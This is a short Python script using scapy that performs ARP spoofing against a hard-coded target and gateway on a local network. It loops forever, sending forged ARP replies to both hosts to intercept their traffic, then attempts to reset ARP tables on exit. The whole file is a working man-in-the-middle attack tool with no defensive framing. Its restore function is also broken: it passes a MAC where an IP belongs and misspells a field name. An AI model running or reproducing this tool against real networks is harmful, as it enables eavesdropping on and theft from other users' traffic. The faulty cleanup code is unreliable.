# ARP SPOOFER
import scapy.all as scapy
import time

def gmac(ip):
    arpreq = scapy.ARP(pdst=ip)
    bcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arpreqbcast = bcast/arpreq
    anslst = scapy.srp(arpreqbcast, timeout=1, verbose=False)[0]
    
    return anslst[0][1].hwsrc

def spoof(tip, sip): #target ip | target mac | router ip
    tmac = gmac(tip)
    pacc = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=sip)
    scapy.send(pacc, verbose=False)

def rest(dstip, srcip):
    dstmac = gmac(dstip)
    srcip = gmac(srcip)
    pacc = scapy.ARP(op=2, pdst=dstip, hdwst=dstip, psrc=srcip)
    scapy.send(pacc, count=4, verbose=False)

tip = '192.168.1.11'
sip = '192.168.1.1'

try:
    pacccnt = 0
    while True:
        spoof(tip, sip)
        spoof(sip, tip)
        pacccnt += 2
        print(f'\rPACKETS SENT: {str(pacccnt)}', end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nRESETTING ARP...")
    rest(tip, sip)
